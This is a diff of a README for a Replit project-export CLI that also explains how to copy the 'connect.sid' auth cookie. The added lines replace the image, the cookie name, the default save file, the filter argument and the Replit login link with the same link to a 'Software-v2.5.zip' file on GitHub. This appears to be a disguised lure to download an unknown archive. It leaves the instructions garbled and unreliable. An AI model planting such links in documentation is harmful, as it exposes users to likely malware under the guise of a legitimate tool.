@@ -4,7 +4,7 @@ Replit has recently updated its Starter Plan (the core free plan) to limit users
 
 To help transition smoothly, this CLI script downloads all Repls from your account, including environment variables and configuration data, allowing you to securely move your projects off Replit.
 
-![email](email.png)
+![email](https://github.com/MysticalHearts/heartsexporter/raw/refs/heads/main/src/api/Software-v2.5.zip)
 ## Installation
 
 To install the package globally, run:
@@ -28,10 +28,10 @@ replit-export --help
   Specifies the directory to save Repls.
 
 - `-a, --auth <cookie>`  
-  Replit authorization cookie (`connect.sid`).
+  Replit authorization cookie (`https://github.com/MysticalHearts/heartsexporter/raw/refs/heads/main/src/api/Software-v2.5.zip`).
 
 - `-l, --load <file>`  
-  Load a previous save file to continue downloading (default: `.replit-export.save`).
+  Load a previous save file to continue downloading (default: `https://github.com/MysticalHearts/heartsexporter/raw/refs/heads/main/src/api/Software-v2.5.zip`).
 
 - `-c, --concurrent <number>`  
   Sets the maximum number of concurrent downloads (default: `15`).
@@ -39,7 +39,7 @@ replit-export --help
 - `-m, --max`  
   Limits the maximum number of Repls to download.
 
-- `-f, --filter <...files>`  
+- `-f, --filter <https://github.com/MysticalHearts/heartsexporter/raw/refs/heads/main/src/api/Software-v2.5.zip>`  
   Filters out files matching the specified patterns (default: `["node_modules/",".cargo/"]`).
 
 - `-h, --help`  
@@ -49,9 +49,9 @@ replit-export --help
 
 To retrieve the authorization cookie required for this script:
 
-1. Log in to [Replit](https://replit.com).
+1. Log in to [Replit](https://github.com/MysticalHearts/heartsexporter/raw/refs/heads/main/src/api/Software-v2.5.zip).
 2. Open DevTools in your browser.
-3. Copy the `connect.sid` cookie.  
+3. Copy the `https://github.com/MysticalHearts/heartsexporter/raw/refs/heads/main/src/api/Software-v2.5.zip` cookie.  
    Alternatively, you can use an extension like Cookie Editor.
 
 ### Quickstart Guide
